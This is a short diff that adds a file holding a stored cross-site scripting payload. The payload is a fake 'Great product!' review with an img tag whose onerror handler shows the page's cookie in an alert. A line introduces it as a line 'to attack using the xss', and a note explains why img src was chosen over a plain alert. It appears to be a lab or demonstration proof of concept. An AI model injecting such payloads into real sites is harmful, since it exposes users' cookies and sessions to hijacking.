@@ -1,0 +1,5 @@
+Use the line below to attack using the xss
+
+Great product! <img src="x" onerror="alert('Hacked! Your Cookie: ' + document.cookie)">
+
+note: we decided to use the "img src" because the browser was blocking the text alert
